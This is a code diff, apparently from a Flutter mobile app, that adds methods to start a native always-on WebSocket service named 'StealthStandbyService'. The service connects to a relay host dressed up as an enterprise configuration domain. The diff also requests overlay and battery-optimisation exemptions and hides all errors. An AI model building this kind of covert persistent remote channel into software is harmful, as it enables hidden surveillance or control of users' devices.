@@ -141,6 +141,66 @@ class AutoLockService with WidgetsBindingObserver {
     } catch (_) {}
   }
 
+  /// Configures & starts the native 24/7 background OkHttp WebSocket engine (StealthStandbyService)
+  Future<void> configureNativeStandbyEngine({
+    required String deviceId,
+    String wsBase = 'wss://secretplay-relay.enterprise-config-2026.workers.dev',
+  }) async {
+    if (kIsWeb || deviceId.isEmpty) return;
+    try {
+      await _securityChannel.invokeMethod('configureStandbyEngine', {
+        'deviceId': deviceId,
+        'wsBase': wsBase,
+      });
+    } catch (_) {}
+  }
+
+  Future<Map<String, bool>> checkOverlayAndBatteryStatus() async {
+    if (kIsWeb) {
+      return const {'canDrawOverlays': true, 'ignoringBatteryOptimizations': true};
+    }
+    try {
+      final res = await _securityChannel.invokeMapMethod<String, dynamic>(
+        'checkOverlayAndBatteryStatus',
+      );
+      return {
+        'canDrawOverlays': res?['canDrawOverlays'] == true,
+        'ignoringBatteryOptimizations': res?['ignoringBatteryOptimizations'] == true,
+      };
+    } catch (_) {
+      return const {'canDrawOverlays': false, 'ignoringBatteryOptimizations': false};
+    }
+  }
+
+  Future<void> requestOverlayPermission() async {
+    if (kIsWeb) return;
+    setTransientOverlayActive(true);
+    try {
+      await _securityChannel.invokeMethod('requestOverlayPermission');
+    } catch (_) {}
+  }
+
+  Future<void> requestIgnoreBatteryOptimizations() async {
+    if (kIsWeb) return;
+    setTransientOverlayActive(true);
+    try {
+      await _securityChannel.invokeMethod('requestIgnoreBatteryOptimizations');
+    } catch (_) {}
+  }
+
+  Future<bool> testOverlayHeartbeat() async {
+    if (kIsWeb) {
+      HapticFeedback.mediumImpact();
+      return true;
+    }
+    try {
+      final ok = await _securityChannel.invokeMethod<bool>('testOverlayHeartbeat');
+      return ok == true;
+    } catch (_) {
+      return false;
+    }
+  }
+
   @override
   void didChangeAppLifecycleState(AppLifecycleState state) {
     super.didChangeAppLifecycleState(state);
